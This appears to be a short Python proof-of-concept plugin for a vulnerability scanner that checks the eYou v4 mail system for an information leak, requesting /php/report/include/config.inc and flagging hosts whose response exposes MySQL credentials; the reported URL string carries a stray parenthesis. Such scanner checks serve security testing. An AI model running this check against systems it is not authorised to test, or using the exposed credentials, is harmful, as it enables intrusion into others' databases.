#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  eYou v4 /php/report/include/config.inc 信息泄露漏洞
Author    :  sqzr
"""

def assign(service, arg):
    if service == "eyou":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'php/report/include/config.inc')
    if code == 200 and 'MYSQL_USER' in res:
        security_info(url + 'php/report/include/config.inc)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('eyou', 'http://www.example.com/')[1])